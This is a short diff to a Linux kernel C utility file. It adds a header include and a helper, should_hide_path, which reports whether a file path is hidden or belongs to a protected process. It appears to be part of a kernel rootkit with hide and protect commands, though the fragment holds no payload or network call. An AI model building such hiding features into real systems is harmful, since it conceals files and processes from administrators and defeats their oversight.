@@ -1,4 +1,5 @@
 #include "inc/util.h"
+#include "inc/cmds.h"
 
 #include <linux/dcache.h>
 #include <linux/fdtable.h>
@@ -24,6 +25,16 @@ void print_debug(const char *caller, char *msg, ...) {
 
   va_end(args);
   kfree(fmt);
+}
+
+bool should_hide_path(struct path *p){
+  /*
+   
+   * is_path_hidden: checks if the path is hidden (see cmds/hide.c)
+   * is_path_protected: checks if the path belongs to a protected process (see cmds/protect.c)
+
+  */
+  return is_path_hidden(p) || is_path_protected(p);
 }
 
 char *path_join(char *p1, char *p2) {
